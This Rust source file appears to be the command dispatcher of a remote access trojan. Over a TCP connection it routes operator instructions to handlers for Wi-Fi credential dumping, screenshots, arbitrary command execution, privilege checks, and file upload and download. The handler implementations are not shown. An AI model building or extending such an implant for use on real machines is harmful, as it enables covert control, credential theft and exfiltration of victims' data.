use std::net::TcpStream;

use shared::InstructMessage;

pub mod filesystem;
pub mod system;
pub mod exec;

pub fn dispatch(instruct: InstructMessage, conn: &mut TcpStream) -> Result<bool, String> {
    match instruct {
        // Close
        InstructMessage::Close => Ok(false),

        // System interaction
        InstructMessage::SysInfo => system::sysinfo(conn), // sysinfo
        InstructMessage::WifiDump => system::wifidump(conn),
        InstructMessage::Check => system::check_privileges(conn), // check
        InstructMessage::Display(content) => system::display_message(content), // display
        InstructMessage::Screenshot => system::screenshot(conn), // check

        InstructMessage::Exec(cmd) => exec::run(conn, cmd),
        // InstructMessage::Shell => exec::run(conn),

        // FileSystem
        InstructMessage::Upload => filesystem::upload(conn),
        InstructMessage::Download(obj) => filesystem::download(obj, conn),
        
        // No registered command
        _ => Ok(true)
    }
}
